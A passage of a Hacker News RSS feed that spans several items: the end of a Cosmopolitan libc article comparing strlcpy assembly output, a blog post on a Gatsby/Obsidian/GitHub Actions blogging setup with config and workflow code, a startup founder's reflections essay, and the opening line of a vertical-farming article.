  a side-effect. When this technique was first implemented for memcpy()
  alone, many of the functions in the Cosmopolitan codebase had their
  generated code size reduced by a third.

</p><p>
  For an example of one such function, consider <code>strlcpy</code>,
  which is the BSD way of saying <code>strcpy</code>:

</p><pre><span>/**
 * Copies string, the BSD way.
 *
 * <span>@param</span> d is buffer which needn't be initialized
 * <span>@param</span> s is a NUL-terminated string
 * <span>@param</span> n is byte capacity of d
 * <span>@return</span> strlen(s)
 * <span>@note</span> d and s can't overlap
 * <span>@note</span> we prefer memccpy()
 */</span>
<span>size_t</span> strlcpy(<span>char</span> *d, <span>const</span> <span>char</span> *s, <span>size_t</span> n) {
  <span>size_t</span> slen, actual;
  slen = strlen(s);
  if (n) {
    actual = MIN(n - 1, slen);
    memcpy(d, s, actual);
    d[actual] = <span>'\0'</span>;
  }
  <span>return</span> slen;
}
</pre>

<p>
  If we compile our <code>strlcpy</code> function, then here's the
  assembly code that the compiler outputs:

</p><table><tbody><tr><td>
<pre><span>/ compiled with traditional libc</span>
<span>strlcpy</span>:
	<span>push</span>	<span>%rbp</span>
	<span>mov</span>	<span>%rsp</span>,<span>%rbp</span>
	<span>push</span>	<span>%r14</span>
	<span>mov</span>	<span>%rsi</span>,<span>%r14</span>
	<span>push</span>	<span>%r13</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r13</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>push</span>	<span>%r12</span>
	<span>push</span>	<span>%rbx</span>
	<span>mov</span>	<span>%rdx</span>,<span>%rbx</span>
	<span>call</span>	strlen
	<span>mov</span>	<span>%rax</span>,<span>%r12</span>
	<span>test</span>	<span>%rbx</span>,<span>%rbx</span>
	<span>jne</span>	1f
	<span>pop</span>	<span>%rbx</span>
	<span>mov</span>	<span>%r12</span>,<span>%rax</span>
	<span>pop</span>	<span>%r12</span>
	<span>pop</span>	<span>%r13</span>
	<span>pop</span>	<span>%r14</span>
	<span>pop</span>	<span>%rbp</span>
	<span>ret</span>
1:	<span>cmp</span>	<span>%rbx</span>,<span>%rax</span>
	<span>mov</span>	<span>%r14</span>,<span>%rsi</span>
	<span>mov</span>	<span>%r13</span>,<span>%rdi</span>
	<span>cmovbe</span>	<span>%rax</span>,<span>%rbx</span>
	<span>mov</span>	<span>%rbx</span>,<span>%rdx</span>
	<span>call</span>	memcpy
	<span>movb</span>	$<span>0</span>,0(<span>%r13</span>,<span>%rbx</span>)
	<span>mov</span>	<span>%r12</span>,<span>%rax</span>
	<span>pop</span>	<span>%rbx</span>
	<span>pop</span>	<span>%r12</span>
	<span>pop</span>	<span>%r13</span>
	<span>pop</span>	<span>%r14</span>
	<span>pop</span>	<span>%rbp</span>
	<span>ret</span>
	<span>.endfn</span>	strlcpy,globl
</pre>
</td><td>
<pre><span>/ compiled with cosmopolitan libc</span>
<span>strlcpy</span>:
	<span>mov</span>	<span>%rdx</span>,<span>%r8</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r9</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>call</span>	strlen
	<span>test</span>	<span>%r8</span>,<span>%r8</span>
	<span>je</span>	1f
	<span>cmp</span>	<span>%r8</span>,<span>%rax</span>
	<span>lea</span>	<span>-1(%r8)</span>,<span>%rdx</span>
	<span>mov</span>	<span>%r9</span>,<span>%rdi</span>
	<span>cmova</span>	<span>%rax</span>,<span>%rdx</span>
	<span>call</span>	MemCpy
	<span>movb</span>	$<span>0</span>,(<span>%r9</span>,<span>%rdx</span>)
1:	<span>ret</span>
	<span>.endfn</span>	strlcpy,globl
</pre>
</td></tr></tbody></table>

<p>
  That's a huge improvement in generated code size. The above two
  compiles used the same gcc flags and no changes to the code needed to
  be made. All that changed was we used cosmopolitan.h (instead of the
  platform c library string.h) which contains ABI specialization macros
  for <code>memcpy</code> and <code>strlen</code>. It's a great example
  of how merely choosing a better C library can systemically eliminate
  bloat throughout your entire codebase.

</p>
</div>]]>
            </description>
            <link>https://justine.lol/cosmopolitan/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556286</guid>
            <pubDate>Mon, 28 Dec 2020 02:59:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Buzzword.engineering Tech Stack]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25556272">thread link</a>) | @todsacerdoti
<br/>
December 27, 2020 | https://buzzword.engineering/post/blog-tech-stack | <a href="https://web.archive.org/web/*/https://buzzword.engineering/post/blog-tech-stack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>I've been meaning to get around to setting up a blog for a long time. In the past, I've gotten as far as getting halfway through trying out different static site generators before getting depressed about my lack of frontend design chops and given up. </p>
<p>The perfect storm finally came: </p>
<ol>
<li>I took <strong>two weeks off</strong>. After recharging my batteries for a few days, I was ready for a little side project. </li>
<li>I recently discovered <a href="https://obsidian.md/" target="_blank" rel="nofollow noopener noreferrer">Obsidian</a>, which is a dope AF note-taking app. </li>
<li>I've tried a decent number of static site generators to build documentation for various projects and wanted to take a deeper dive into <a href="https://gatsbyjs.com/" target="_blank" rel="nofollow noopener noreferrer">Gatsby</a>. </li>
<li>I recently discovered <a href="https://pipedream.com/" target="_blank" rel="nofollow noopener noreferrer">Pipedream</a> and wanted to use it for something. </li>
</ol>
<p>I wanted to see if i could use Obsidian as a <a href="https://en.wikipedia.org/wiki/Content_management_system" target="_blank" rel="nofollow noopener noreferrer">content management system (CMS)</a> for a tech blog and Pipedream to automate tweeting out new blog posts. </p>
<div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span><strong>Spoiler Alert</strong></h5></p><p>It was, in fact, possible.</p></div>
<p>Anyway, here's Buzzword Engineering's inaugural blog post. If you like it, go give me a github star on the <a href="https://github.com/steven-terrana/steven-terrana.github.io" target="_blank" rel="nofollow noopener noreferrer">blog repo</a> or something. It's a nice dopamine boost and fuels my self-worth. </p>

<p>Let's dive in. Here's a digram for those visual learners out there. </p>
<p><span>
      <a href="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/45662/overview.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/8ac56/overview.webp 240w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/d3be9/overview.webp 480w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/e46b2/overview.webp 960w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/e97dc/overview.webp 1410w" sizes="(max-width: 960px) 100vw, 960px" type="image/webp">
        <source srcset="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/8ff5a/overview.png 240w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/e85cb/overview.png 480w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/d9199/overview.png 960w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/45662/overview.png 1410w" sizes="(max-width: 960px) 100vw, 960px" type="image/png">
        <img src="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/d9199/overview.png" alt="This diagram shows an overview of buzzword.engineering tech stack and associated automation" title="This diagram shows an overview of buzzword.engineering tech stack and associated automation" loading="lazy">
      </picture>
  </a>
    </span></p>
<div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span><strong>Excalidraw is Dope</strong></h5></p><p>If you haven't heard of it, stop reading this and go play with <a href="https://excalidraw.com/" target="_blank" rel="nofollow noopener noreferrer">Excalidraw</a> and then come back. It's the tool I used to sketch out this diagram.</p></div>
<h2 id="obsidian"><a href="#obsidian" aria-label="obsidian permalink"></a>Obsidian</h2>
<p>I'll keep this short.  Maybe a future blog post will talk about Obsidian in a lot more detail. For now, let me just say that I've tried to get into taking notes for... a long time. I could never do it in college. I struggle to do it for work. I've always found that taking notes takes away from my ability to absorb the content in the moment and make meaningful contributions. </p>
<p>Obsidian was the first app that actually made me <strong>want</strong> to take notes. The general idea is that all your notes are written in markdown. Jumping around is super easy with <code>CMD + O</code> (which also will create pages for you if they don't exist).  Linking between pages to build connections is really easy as can be with a syntax like <code>[[this]]</code>. Obsidian builds a visual graph of the relationships between pages (I'm a sucker for graphs). And finally, you can build templates and insert them with <code>CMD + T</code>. Templates dramatically simplified the boiler plate needed to capture who's attending a meeting, agenda, the date, etc. </p>
<p>Long story short, try it out.  (Or don't, whatever.)  I'm a fan and thought that maybe if I can use it as the interface for writing blog posts that I might <em>actually</em> write some. </p>
<h3 id="automated-backups"><a href="#automated-backups" aria-label="automated backups permalink"></a>Automated Backups</h3>
<p>Obsidian has some 3rd-party plugins that do nifty things.  One of these plugins is called <a href="https://github.com/denolehov/obsidian-git" target="_blank" rel="nofollow noopener noreferrer">Obsidian Git</a> which can automatically backup your notes to a Git repository.</p>
<p>I figured that had to be a way to fetch markdown content from a remote github repository and use it as a content source for Gatsby. There was.</p>
<h3 id="defining-post-information"><a href="#defining-post-information" aria-label="defining post information permalink"></a>Defining Post Information</h3>
<p>Blog post information is defined through the markdown frontmatter.  For example, the frontmatter for this blog post: </p>
<div data-language="yaml"><pre><code><span>---</span>
<span>title</span><span>:</span> The buzzword.engineering Tech Stack
<span>date</span><span>:</span> <span>"12/26/2020"</span>
<span>publish</span><span>:</span> <span>true</span>
<span>template</span><span>:</span> <span>"post"</span>
<span>slug</span><span>:</span> blog<span>-</span>tech<span>-</span>stack
<span>description</span><span>:</span> <span>"I finally got around to putting a blog together that uses Obsidian, Gatsby, and automates tweeting out new posts with Pipedream."</span>
<span>---</span></code></pre></div>
<h2 id="gatsby"><a href="#gatsby" aria-label="gatsby permalink"></a>Gatsby</h2>
<p>I think it's important to start here by saying that I'm <strong>not</strong> a frontend developer. Well, let's rephrase that. I'm writing a blog post that has Gatsby in it.  So it's probably more accurate to say that I'm a <em>very</em> junior frontend developer. </p>
<p>My mental model for Gatsby so far is that it's a framework for building static site generators. There might be a couple frontend purists or gatsby enthusiasts out there who take issue with that definition, please let me know if you've got a better one down in the comments. </p>
<p>There are two main components of Gatsby that drew me to it: </p>
<ol>
<li>It uses <a href="https://reactjs.org/" target="_blank" rel="nofollow noopener noreferrer">React</a>, which is a lot more powerful to me over something like <a href="https://handlebarsjs.com/" target="_blank" rel="nofollow noopener noreferrer">handlebars</a> or go-based html templating. </li>
<li>Gatsby is extensible with a rich plugin ecosystem that contribute to a shared <a href="https://graphql.org/" target="_blank" rel="nofollow noopener noreferrer">GraphQL</a> data layer. When developing your site, you can query the data layer to fetch content for particular pages/components.</li>
</ol>
<p>I like React and I think Gatsby's extensibility framework and GraphQL data layer is <strong>brilliant</strong>. </p>
<h3 id="the-starter"><a href="#the-starter" aria-label="the starter permalink"></a>The Starter</h3>
<p>Another great thing about Gatsby is their concept of Starters. For this blog, I kicked things off with the <a href="https://github.com/alxshelepenok/gatsby-starter-lumen" target="_blank" rel="nofollow noopener noreferrer">gatsby-starter-lumen</a>. </p>
<h3 id="fetching-content"><a href="#fetching-content" aria-label="fetching content permalink"></a>Fetching Content</h3>
<p>The first thing I had to customize was content sources. The Lumen starter fetches content from the same repository as the blog itself. Thankfully, there's a Gatsby plugin called <a href="https://www.gatsbyjs.com/plugins/gatsby-source-git" target="_blank" rel="nofollow noopener noreferrer"><code>gatsby-source-git</code></a> that allows you to fetch content from a remote Git repository. </p>
<p>During development, I wanted to be able to fetch content from the local copy of the Obsidian backup repository. Gatsby plugins are done by exporting a javascript object from a file called <code>gatsby-config.js</code>.  </p>
<p>Here, I toggle between using the <code>gatsby-source-git</code> plugin and the [<code>gatsby-source-filesystem</code>] based on whether a <code>GATSBY_PREVIEW</code> environment variable is set. </p>
<div data-language="js"><pre><code><span>if</span><span>(</span>process<span>.</span>env<span>.</span><span>GATSBY_PREVIEW</span> <span>==</span> <span>"true"</span><span>)</span><span>{</span>
  console<span>.</span><span>log</span><span>(</span><span><span>`</span><span>using local vault path: </span><span><span>${</span>siteConfig<span>.</span>obsidian<span>.</span>vaultPath<span>}</span></span><span>`</span></span><span>)</span>
  config<span>.</span>plugins<span>.</span><span>unshift</span><span>(</span><span>{</span>
    resolve<span>:</span> <span>'gatsby-source-filesystem'</span><span>,</span>
    options<span>:</span> <span>{</span>
      path<span>:</span> siteConfig<span>.</span>obsidian<span>.</span>vaultPath<span>,</span>
      name<span>:</span> <span>'local_obsidian'</span><span>,</span>
      ignore<span>:</span> <span>[</span> <span>"**/.git/**/*"</span><span>,</span> <span>"**/.obsidian/**/*"</span><span>,</span> <span>"**/Templates/**/*"</span> <span>]</span>
    <span>}</span>
  <span>}</span><span>)</span>
<span>}</span> <span>else</span><span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>"fetching from remote repo: "</span><span>,</span> siteConfig<span>.</span>obsidian<span>.</span>repo<span>)</span>
  config<span>.</span>plugins<span>.</span><span>unshift</span><span>(</span><span>{</span>
    resolve<span>:</span> <span><span>`</span><span>gatsby-source-git</span><span>`</span></span><span>,</span>
    options<span>:</span> <span>{</span>
      name<span>:</span> <span><span>`</span><span>obsidian</span><span>`</span></span><span>,</span>
      remote<span>:</span> siteConfig<span>.</span>obsidian<span>.</span>repo<span>,</span>
      patterns<span>:</span> <span>[</span> <span>"!**/Templates/**/*"</span><span>,</span> <span>"**/*"</span> <span>]</span>
    <span>}</span>
  <span>}</span><span>)</span>
<span>}</span></code></pre></div>

<p>Comments on blog posts are made possible through a nifty tool called <a href="https://utteranc.es/" target="_blank" rel="nofollow noopener noreferrer">utteranc.es</a>. It's a GitHub Application that uses GitHub Issue threads per blog post to track comments. </p>
<h3 id="post-filtering"><a href="#post-filtering" aria-label="post filtering permalink"></a>Post Filtering</h3>
<p>In the spirit of premature optimization, I wanted to integrate a way to filter blog posts with fuzzy-searching. To accomplish this, I integrated <a href="https://fusejs.io/" target="_blank" rel="nofollow noopener noreferrer">Fuse.js</a> and added a new <code>Filter</code> component to the blog. </p>
<p>Most of the logic for how this was accomplished can be seen in the <a href="https://github.com/steven-terrana/steven-terrana.github.io/blob/main/src/templates/index-template.js" target="_blank" rel="nofollow noopener noreferrer">Index Template</a>.</p>
<div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>caution</h5></p><p>I wanted to insert a gif of the filtering taking place. Apparently that's easier said than done with Gatsby and<code>gatsby-transform-remark</code>.  I'll update this post once I get gifs working üôÑ.</p></div>
<h2 id="automation"><a href="#automation" aria-label="automation permalink"></a>Automation</h2>
<p>With the site actually working how I wanted it to, I got to focus on the side of things I'm actually good at: digital duct tape. The goal is for changes in markdown content in the Obsidian backup repository to trigger a deployment of the site and if there is a new blog post, to send out a tweet letting you all know about it. </p>
<h3 id="step-1-github-action-on-the-obsidian-backup-repo"><a href="#step-1-github-action-on-the-obsidian-backup-repo" aria-label="step 1 github action on the obsidian backup repo permalink"></a>Step 1: GitHub Action on the Obsidian Backup Repo</h3>
<p>First things first, the content repository needs to trigger a deployment of the site. The easiest way I could think to accomplish this would be to a GitHub Action on the blog post repository that does the build/deploy logic. </p>
<p>This meant that I needed a way to invoke a GitHub Action on one repository as part of the execution of an Action on another repository. This is where the <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/events-that-trigger-workflows#repository_dispatch" target="_blank" rel="nofollow noopener noreferrer"><code>repository_dispatch</code></a> event comes in handy. Basically, it means that you can use the GitHub API to trigger an Action. </p>
<p>Here's what the GitHub Action workflow looks like for the obsidian repository: </p>
<div data-language="yaml"><pre><code><span>name</span><span>:</span> Trigger Build
<span>on</span><span>:</span>
  
  <span>push</span><span>:</span>
    <span>branches</span><span>:</span> <span>[</span> main <span>]</span>
  
  <span>workflow_dispatch</span><span>:</span>

<span>jobs</span><span>:</span>
  <span>trigger</span><span>:</span>
    <span>runs-on</span><span>:</span> ubuntu<span>-</span>latest
    <span>steps</span><span>:</span>
     <span>-</span> <span>name</span><span>:</span> Trigger Upstream Blog Action
        <span>run</span><span>:</span> <span>|</span><span>
          curl -XPOST \
          -u "${{ secrets.PAT_USERNAME}}:${{secrets.PAT_TOKEN}}" \
          -H "Accept: application/vnd.github.everest-preview+json" \
          -H "Content-Type: application/json" \
          https://api.github.com/repos/steven-terrana/steven-terrana.github.io/dispatches \
          --data '{"event_type": "blog"}'</span></code></pre></div>
<h3 id="step-2-github-action-on-the-blog-repo"><a href="#step-2-github-action-on-the-blog-repo" aria-label="step 2 github action on the blog repo permalink"></a>Step 2: GitHub Action on the Blog Repo</h3>
<p>Sweet. Now commits to the Obsidian backup repository will trigger actions on the blog repository. </p>
<p>The next step was to automate the build and deployment steps using a GitHub Action on the blog repository. Here's what that action looks like: </p>
<div data-language="yaml"><pre><code><span>name</span><span>:</span> Build and Publish
<span>on</span><span>:</span>
  <span>repository_dispatch</span><span>:</span>
  <span>workflow_dispatch</span><span>:</span>

<span>jobs</span><span>:</span>
  <span>build-deploy-notify</span><span>:</span>
    <span>runs-on</span><span>:</span> ubuntu<span>-</span>latest
    <span>steps</span><span>:</span>
      
      <span>-</span> <span>name</span><span>:</span> Checkout Code üõé
        <span>uses</span><span>:</span> actions/checkout@v2
        <span>with</span><span>:</span> 
          <span>persist-credentials</span><span>:</span> <span>false</span>
       <span>-</span> <span>name</span><span>:</span> Install &amp; Build üîß
        <span>run</span><span>:</span> <span>|</span><span>
          npm ci
          npm run build
          echo "buzzword.engineering" &gt; public/CNAME</span>
        <span>env</span><span>:</span> 
          <span>PAT_USER</span><span>:</span> $<span>{</span><span>{</span> secrets.PAT_USER <span>}</span><span>}</span>
          <span>PAT_TOKEN</span><span>:</span> $<span>{</span><span>{</span> secrets.PAT_TOKEN <span>}</span><span>}</span>
      <span>-</span> <span>uses</span><span>:</span> peaceiris/actions<span>-</span>gh<span>-</span>pages@v3
        <span>with</span><span>:</span>
          <span>github_token</span><span>:</span> $<span>{</span><span>{</span> secrets.GITHUB_TOKEN <span>}</span><span>}</span>
          <span>publish_dir</span><span>:</span> public
          <span>force_orphan</span><span>:</span> <span>true</span>  </code></pre></div>
<p>This blog is hosted using GitHub Pages, so you'll notice a few things:</p>
<ol>
<li>I add a custom <code>CNAME</code> file to the <code>public</code> directory so that GitHub Pages knows the custom domain for this blog.  (I should definitely incorporate this into an inherit part of the build of the site using the <code>onPostBuild</code> Gatsby Node API method or something). </li>
<li>I use the <code>peaceiris/actions-gh-pages</code> action to publish the site. </li>
</ol>
<p>All in all, this was a pretty painless setup. </p>
<h3 id="step-3-automating-tweets"><a href="#step-3-automating-tweets" aria-label="step 3 automating tweets permalink"></a>Step 3: Automating Tweets</h3>
<p>So at this point, we've got content changes automatically getting deployed to GitHub Pages. The whole process takes about <strong>three minutes</strong> from commit to publish. </p>
<p>The last piece was to automate letting all of you know about the whatever new insightful thing I had to say! </p>
<p>I had stumbled on <a href="https://pipedream.com/" target="_blank" rel="nofollow noopener noreferrer">Pipedream</a> before through targeted ads and sort of ignored it until I saw <a href="https://twitter.com/rawkode" target="_blank" rel="nofollow noopener noreferrer">David McKay</a> talk about how much he loves it on <a href="https://rawkode.live/" target="_blank" rel="nofollow noopener noreferrer">rawkode.live</a>. Here's a <a href="https://youtu.be/Q8ZJ_5zxfmo" target="_blank" rel="nofollow noopener noreferrer">link to the stream</a>!</p>
<p>I went into this adventure thinking I was going to have to do all kinds of fancy logic and scripting to make this possible. I was wrong. </p>
<p>After setting up a Pipedream account, starting looking at what event sources were available to trigger a workflow. Well, the Lumen gatsby ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://buzzword.engineering/post/blog-tech-stack">https://buzzword.engineering/post/blog-tech-stack</a></em></p>]]>
            </description>
            <link>https://buzzword.engineering/post/blog-tech-stack</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556272</guid>
            <pubDate>Mon, 28 Dec 2020 02:56:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lessons I‚Äôve learned after 10 years and $10M in sales]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25555137">thread link</a>) | @rookhack
<br/>
December 27, 2020 | https://jamesclift.ca/7-things-ive-learned-after-10-years-of-trying-to-make-it-on-the-internet-2bbd8b60f5a?source=friends_link&sk=fe41337b9e6efa39a7ba9c297338c3b7 | <a href="https://web.archive.org/web/*/https://jamesclift.ca/7-things-ive-learned-after-10-years-of-trying-to-make-it-on-the-internet-2bbd8b60f5a?source=friends_link&sk=fe41337b9e6efa39a7ba9c297338c3b7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><div><div><div><p><a href="https://jamesclift.medium.com/?source=post_page-----2bbd8b60f5a--------------------------------" rel="noopener"><img alt="James Clift" src="https://miro.medium.com/fit/c/96/96/1*Ax3-HNLKsss3ruWjpgvpXg.jpeg" width="48" height="48"></a></p></div></div></div></div><p id="9d97">I‚Äôve been playing the technology company game for over a decade now.</p><p id="63cf">In that time, I went from a 20 year old kid who had no idea what he was doing to a man with a good beard who has no idea what he is doing that happened to sell millions of dollars of software.</p><p id="b011">I don‚Äôt often reflect on absurdity of it, but it is absurd.</p><p id="36c0">Weirder still, I‚Äôm the least impressive of my friends in this world ‚Äî I‚Äôve had the good fortune of being surrounded by people who started off exactly like I did build massive companies with hundreds of employees.</p><p id="ce22">As a kid, the only jobs I knew of that ‚Äúrich‚Äù people had were doctor, lawyer, and that scary kid who‚Äôs dad was probably in the mob. Becoming a millionaire was not discussed, nor even imagined. Yet, here we are.</p><p id="acdf">Here are a few things I‚Äôve learned from a decade of trying to make it on the internet.</p><p id="bcf1">The low point of (one of) my first companies was being so desperate for revenue that we adapted our<em> virtual job fair</em> platform to become a virtual business directory for a small town. For $2000/yr.</p><p id="6385">There is no upside to that. We essentially became a horribly paid consultant for an industry we didn‚Äôt care about with a product that didn‚Äôt add any value.</p><p id="f2cc">Limping along for years while eating ramen and pitching a VISION isn‚Äôt success ‚Äî you‚Äôll be much worse off than if you had just worked for a startup for a few years to improve your skills and peers.</p><p id="ce0b">To truly bet on yourself while starting a company, everything you do should accelerate any of the following:</p><ul><li id="bc69">Learning new skills: sales, product management, product development, engineering, marketing, design, fundraising</li><li id="12a6">Meeting great people ‚Äî not in the ‚ÄúI shook Mark Cuban‚Äôs hand‚Äù sense, but in the ‚ÄúI have 5 equally motivated people in my corner building shit that I can text about the fact that we won‚Äôt make payroll next month.‚Äù</li><li id="c5c2">Making money on your own time</li><li id="00e0">Travelling or experiencing the world through a different lens (though in 2020 you should just get a remote job)</li></ul><p id="ae33">You don‚Äôt need mentors. You don‚Äôt need investors. You need 5 friends with similar ambitions trying to figure this shit out with you.</p><p id="537b">You want people that you can call when your world is falling apart. When you want to quit. When you hate your co-founders. When you‚Äôre questioning everything. When you‚Äôve made the money, but don‚Äôt feel good about it.</p><p id="8018">It is a weird, un-relatable world that we‚Äôre playing in. To navigate it, you need people that understand. I‚Äôm so lucky I found my people.</p><p id="1451">I don‚Äôt have great advice on how to find your people.</p><p id="c46f">Join a co-working space? Get into a startup accelerator? Join a program like <a href="https://www.beondeck.com/" rel="noopener">On Deck</a>? Message people on Twitter?</p><p id="64cd">I know many people who are much more talented than I. They‚Äôve got better ideas, more technical skills, and are just plain smarter.</p><p id="1d7d">What they don‚Äôt have is that forcing function that compels me to launch stuff.</p><p id="7bb3">The shamelessness. The not-give-a-fuckery.</p><p id="2ae5">To not quit when I want to quit. I‚Äôm not sure that ‚Äúchip on the shoulder‚Äù is all positive, but it‚Äôs probably necessary.</p><p id="aaf9">It‚Äôs a learned behaviour. I don‚Äôt come by it naturally. I hate failing. I suck at getting feedback. I‚Äôm overly sensitive. And yet, here we are.</p><p id="cccf">Every successful individual I‚Äôve seen has taken at least 3 years to create something with some hint of product market fit.</p><p id="1a79">Dig deeper into every company that takes off overnight ‚Äî it‚Äôs probably a pivot from something else, the founder‚Äôs 8th attempt, or a hail mary. The one thing that truly worked for me was about 3.5 years in.</p><p id="8fb0">That specific thing worked in month 2, but it took 3.5 years of learning to get to that point.</p><p id="2606">My original goal when starting out (Thanks Tim Ferriss!) was to <em>‚Äúbuild a business making 10k a month so I could work from anywhere.‚Äù</em></p><p id="b9da">I got there, and enjoyed it ‚Äî lived in multiple countries, didn‚Äôt work too much, drank great wine and ate incredible steak. It wasn‚Äôt enough.</p><p id="9d82">Financially, it didn‚Äôt matter. The cash was enough, but a life of leisure isn‚Äôt a great goal for a 30 year old. I stopped growing, learning.</p><p id="0969">Ironically, that guiding goal held me back. What seemed ambitious at the time led to unambitious decisions, like first building a below average web design company. It also led to coasting when cashflow was (very) good.</p><p id="cdd3">I somehow managed to reverse engineered my version of success, but unfortunately financial success is always a moving target ‚Äî especially once you have something that works.</p><p id="0d0a">What would have been a better focus is building an exceptional product, an amazing team, and continuing to grow as a leader.</p><p id="65c1">If you can solve for those things, the score (and the cash) takes care of itself.</p><p id="6a9b">That said, if your goal is to build a company that makes 10k/mo that allows you to work from anywhere ‚Äî go for it, goddamnit.</p><p id="38f1">Building something from scratch is hard, and having a job will often sound very appealing.</p><p id="9e48"><em>Here‚Äôs what you need to do today, and here‚Äôs your paycheque!</em></p><p id="a7a7">Starting a company has infinite variables. At the early stages, you‚Äôre pushing a boulder up every hill you can find. You‚Äôre trying to find that one thing that gathers enough momentum to allow you to survive another day.</p><p id="664a">If you‚Äôre lucky, you‚Äôll get to a place where you‚Äôre no longer trying to survive ‚Äî you‚Äôre trying not to die. There‚Äôs a difference.</p><p id="6c93">Every day you will have an infinite to-do list, none of which is certain.Take your best guess at what the most important thing you can work on is.</p><p id="6202">Do that thing, and try to ignore everything else.</p><p id="ee2b">Don‚Äôt forget to manage your psychology along the way. At the end of the day no one cares if you fail, and it‚Äôs not that important. Have grounding forces in your life (sports, family, knitting) to help keep you sane. Try not to build your whole identity around your company.</p><p id="950c">(You won‚Äôt do any of this, but I‚Äôm hopeful this will help you realize you‚Äôre not the only one.)</p><p id="6c90">Most people who reach unheard of levels of success are probably not that much smarter than you, and they probably don‚Äôt work that much harder.</p><p id="d7fd">Granted, there are ridiculously smart driven people that operate on another level (Elon Musk, The Collisons). They‚Äôre likely going to be trillionaires.</p><p id="7870">I‚Äôve met many people who have built $100m+ companies that are very smart and work very hard ‚Äî but probably not that much harder than a Senior Engineer at Amazon. Success is a result of talent, hard work, and luck.</p><p id="3b30">If you‚Äôre smart, want to work hard, and care about building a business one day ‚Äî the best place to put that energy is into creating something new.</p><p id="7ac5">You can‚Äôt get lucky if you‚Äôre not in the game.</p></div></div></section></div>]]>
            </description>
            <link>https://jamesclift.ca/7-things-ive-learned-after-10-years-of-trying-to-make-it-on-the-internet-2bbd8b60f5a?source=friends_link&amp;sk=fe41337b9e6efa39a7ba9c297338c3b7</link>
            <guid isPermaLink="false">hacker-news-small-sites-25555137</guid>
            <pubDate>Sun, 27 Dec 2020 23:27:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[2-Acre Vertical Farm Run by AI and Robots Out-Produces 720-Acre Flat Farm]]>
            </title>
            <description>
<![CDATA[
Score 401 | Comments 370 (<a href="https://news.ycombinator.com/item?id=25554941">thread link</a>) | @wrycoder
<br/>
December 27, 2020 | https://www.intelligentliving.co/vertical-farm-out-produces-flat-farm/ | <a href="https://web.archive.org/web/*/https://www.intelligentliving.co/vertical-farm-out-produces-flat-farm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<p><a href="https://www.plenty.ag/" target="_blank" rel="noopener">Plenty</a> is an ag-tech startup in San Francisco, co-founded by Nate Storey, that is reinventing farms and farming. Storey, who is also the company‚Äôs chief science officer, says the future of farms is vertical and indoors because that way, the food can grow anywhere in the world, year-round; and the future of farms employ robots and AI to continually improve the quality of growth for fruits, vegetables, and herbs. Plenty does all these things and uses 95% less water and 99% less land because of it.</p>
